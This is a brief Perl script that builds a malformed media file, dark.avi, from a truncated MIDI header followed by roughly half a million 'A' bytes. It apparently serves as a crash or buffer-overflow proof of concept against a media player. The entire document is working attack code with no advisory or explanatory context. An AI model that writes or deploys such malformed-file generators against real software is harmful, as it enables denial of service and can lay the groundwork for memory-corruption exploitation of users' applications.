#!/usr/bin/perl
my $h ="\x4D\x54\x68\x64\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00";
my $d = "\x41" x 500429 ;


my $file = "dark.avi";

open ($File, ">$file");
print $File $h,$d;
close ($File);
